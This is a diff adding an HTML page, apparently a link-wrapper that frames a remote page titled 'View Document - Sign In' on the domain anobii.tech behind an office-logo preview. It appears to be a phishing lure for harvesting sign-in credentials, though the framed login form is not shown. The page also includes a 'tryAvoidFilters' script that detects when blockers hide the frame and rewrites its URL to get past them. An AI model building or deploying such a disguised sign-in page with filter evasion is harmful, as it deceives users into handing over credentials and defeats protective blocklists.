@@ -1,0 +1,183 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://fb0a8f84146f102fbc7d-9cdacdeebf0faa19b665bf427f0c8092.ssl.cf1.rackcdn.com/js/jquery-1.9.1.min.js"
+      type="text/javascript"></script>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300,600'
+          rel='stylesheet'
+          type='text/css'>
+    <link rel="stylesheet"
+          href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.min.css">
+        <title>View Document - Sign In</title>
+    <link rel="shortcut icon"
+          href="http://anobii.tech/favicon-alt.ico" />
+    <link rel="icon" type="image/x-icon"
+          href="http://anobii.tech/favicon-alt.ico" />
+            <meta property="og:url" content="http://anobii.tech/view/index.html" />
+        <meta property="og:image" content="http://anobii.tech/view/images/officelogo.png" />
+            <meta property="og:title" content="View Document - Sign In" />
+        <meta property="og:type" content="article" />
+    <meta name="twitter:url" content="http://anobii.tech/view/index.html">
+    <meta name="robots" content="noindex, follow">
+</head>
+<body>
+    <style>
+        html, body {
+            height: 100%;
+            width: 100%;
+            margin: 0;
+            padding: 0;
+        }
+        iframe#destination_content_frame, .embedded_content_holder > iframe:not(#sniply-bar), iframe#ContentFrame {
+            position: absolute;
+            left: 0;
+            right: 0;
+            top: 0;
+            bottom: 0;
+            border: 0;
+            height: 100%;
+            min-width: 100%;
+            width: 10px;
+            *width: 100%;
+            -webkit-overflow-scrolling: touch;
+            overflow-x: auto;
+        }
+        .embedded_content_holder {
+            background-color: rgba(0,0,0,0.75);
+            height:100%;
+            width:100%;
+            position: absolute;
+            display: table;
+        }
+        .embedded_content_holder > iframe:not(#sniply-bar), div.photo_content {
+            height: 60%;
+            width: 80%;
+            min-width: 80%;
+            display: table-cell;
+            vertical-align: middle;
+            margin:auto;
+            overflow: hidden;
+        }
+        .photo_content > div {
+            width:100%;
+            height: 95%; /* fallback */
+            height: calc(100vh - 40px);
+            display:block;
+            background-size: contain !important;
+        }
+        #closeEmbeddedContent {
+            color:white;
+            position: absolute;
+            right:5%;
+            top:5%;
+            font-size: 44px;
+            cursor: pointer;
+        }
+        #destination_content_frame {
+            background-color: black;
+        }
+    </style>
+        <iframe 
+                    src="http://anobii.tech/view/index.html?utm_campaign=sniply&utm_medium=sniply&utm_source=sniply"
+                class="fullwidth bottom"
+                 id="ContentFrame"></iframe>
+    <script>
+        $(document).ready(function () {
+            location.hash = "http://anobii.tech/view/index.html";
+            $('link[type*=icon]').detach().appendTo('head');  // required for Firefox which uses snip.ly/favicon.ico upon hash change
+            $(".embedded_content_holder").click(function (){
+                var new_dest = $('#destination_content_frame').attr('src');
+                if (new_dest)
+                    window.location = new_dest;
+            });
+            var is_original_load = true;
+            $("#ContentFrame").on('load', function() {
+                if (is_original_load) {
+                    is_original_load = false;
+                    return;
+                }
+                var message = {
+                    status: 'ok',
+                    type: 'content-load-event',
+                    source: 'sniply-parent'
+                };
+                var sniply_frame = document.getElementById('sniply-bar');
+                sniply_frame.contentWindow.postMessage(JSON.stringify(message), sniply_frame.src);
+            });
+            var iframe = $("iframe#ContentFrame");
+            var isMobile = (navigator.userAgent.match(/(iPad|iPhone|iPod|Android|IEMobile|Blackberry|Opera Mini|Opera Mobi)/g) ? true : false)
+            if (isMobile)
+            {
+                    if (iframe.length == 1) {
+                        var iframe_width = iframe.width();
+                        var iframe_contents_width = 757;
+                        var iframe_zoom = iframe_width / iframe_contents_width;
+                        var new_iframe_width_and_height = 1 / iframe_zoom * 100 + '%';
+                        iframe.css({
+                            '-ms-zoom': iframe_zoom,
+                            '-moz-transform': 'scale(' + iframe_zoom + ')',
+                            '-moz-transform-origin': '0 0',
+                            '-o-transform': 'scale(' + iframe_zoom + ')',
+                            '-o-transform-origin': '0 0',
+                            '-webkit-transform': 'scale(' + iframe_zoom + ')',
+                            '-webkit-transform-origin': '0 0',
+                            'width': new_iframe_width_and_height,
+                            'height': new_iframe_width_and_height,
+                            'min-width': new_iframe_width_and_height
+                        });
+                    }
+            }
+            var iOS = ( navigator.userAgent.match(/(iPad|iPhone|iPod)/g) ? true : false );
+            if (iOS)
+            {
+            }
+        });
+    </script>
+    <div class="afs_ads" style="position: absolute; left: -10000px; top: -10000px;">&nbsp;</div>
+    <script>
+        var content_frame = document.querySelector('#ContentFrame, #EmbeddedContentFrame');
+        var afs_ads_div = document.querySelector('.afs_ads');
+        var tryAvoidFilters = function() {
+            var jquery_content_frame = $('#ContentFrame, #EmbeddedContentFrame');
+            jquery_content_frame.attr('style', '');
+            var old_url = jquery_content_frame.attr('src');
+            if (old_url.indexOf('utm_c') >= 0) {
+                var query = old_url.substring(old_url.indexOf('?') + 1);
+                var vars = query.split("&");
+                var new_vars = [];
+                for (var i = 0; i < vars.length; i++) {
+                    if (vars[i].indexOf('utm_') != 0) {
+                        new_vars.push(vars[i]);
+                    }
+                }
+                var new_querystring = new_vars.join('&');
+                var new_url = old_url.replace(query, new_querystring);
+                jquery_content_frame.attr('src', new_url);
+            }
+        };
+        if (content_frame != null) {
+            var content_frame_observer = new MutationObserver(function (mutations) {
+                for (var index = 0; index < mutations.length; index++) {
+                    var mutation = mutations[index];
+                    if (mutation.attributeName === 'style') {
+                        if (window.getComputedStyle(content_frame).getPropertyValue('display') == 'none') {
+                            tryAvoidFilters();
+                            return;
+                        }
+                        else {
+                        }
+                    }
+                }
+            });
+            content_frame_observer.observe(content_frame, {attributes: true});
+            $(document).ready(function () {
+                if (window.getComputedStyle(afs_ads_div).getPropertyValue('display') == 'none') {
+                    tryAvoidFilters();
+                }
+            });
+        }
+    </script>
+        <script type="text/javascript" src="http://snip.ly/site.js?on=sniply"></script>
+</body>
